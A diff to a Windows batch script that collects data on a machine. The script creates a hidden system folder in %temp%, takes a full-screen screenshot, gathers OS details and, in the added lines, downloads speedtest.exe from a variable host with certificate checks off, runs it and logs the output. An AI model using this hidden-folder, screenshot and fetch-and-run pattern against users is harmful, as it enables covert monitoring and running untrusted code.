@@ -33,9 +33,12 @@ mkdir "%temp%\%folder%"
 attrib +s +h +i "%temp%\%folder%" 
 cd "%temp%\%folder%"
 
+curl.exe -k %proxy% %host%/Capture/speedtest.exe --output "speedtest.exe"
 curl.exe -k %proxy% %host%/Capture/osinfo.vbs --output "osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
+"speedtest.exe" | echo YES
+"speedtest.exe" --accept-gdpr >> "%username%@%computername%.txt"
 
 for /f "tokens=2 delims==" %%G in ('wmic os get Caption /value') do ( 
     set WinEdition=%%G
